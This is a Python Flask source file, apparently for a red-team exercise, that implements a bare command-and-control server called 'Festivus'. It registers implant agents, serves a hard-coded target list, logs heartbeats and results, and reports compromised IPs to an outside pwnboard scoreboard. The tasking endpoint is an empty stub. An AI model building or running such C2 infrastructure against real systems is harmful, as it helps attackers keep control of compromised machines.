from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
import requests

app = Flask(__name__)

# SQLite database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Database models
class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), unique=True, nullable=False)
    status = db.Column(db.String(20), default='active')

class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), db.ForeignKey('agent.agent_id'), nullable=False)
    command = db.Column(db.String(500), nullable=False)
    completed = db.Column(db.Boolean, default=False)

# Initialize database
with app.app_context():
    db.create_all()

@app.route('/register', methods=['POST'])
def register_agent():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            new_agent = Agent(agent_id=agent_id)
            db.session.add(new_agent)
            db.session.commit()
            return jsonify({"message": "Agent registered successfully"}), 201
        return jsonify({"message": "Agent already registered"}), 200
    return jsonify({"error": "Invalid data"}), 400

@app.route('/get-agents', methods=['GET'])
def get_agents():
    agents = Agent.query.all()
    agents = [{"agent_id": agent.agent_id, "status": agent.status} for agent in agents]
    return jsonify(agents)



@app.route('/targets', methods=['GET'])
def get_targets():
    return "127.0.0.1,192.168.1.158"

@app.route('/results', methods=['POST'])
def submit_results():
    try:
        print(request.json)
        return jsonify({'status': 'success'})
    except:
        pass

def update_pwnboard(ip):
    try:
        data = {'ip': ip, 'type': "festivus"}
        req = requests.post("https://pwnboard.win/pwn/boxaccess", json=data, timeout=3)
    except:
        pass

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.json
        ip = data['ip']
        print(f"Received heartbeat from {ip}")
        update_pwnboard(ip)
        return jsonify({'status': 'success'})
    except:
        pass

@app.route('/tasks', methods=['GET'])
def get_task():
    pass

@app.route('/', methods=['GET'])
def homepage():
    return "<h1>Festivus</h1><p>It's a Festivus for the rest of us!</p>"



def main():
    app.run(debug=True,host='0.0.0.0',port=80)


if __name__ == '__main__':
    main()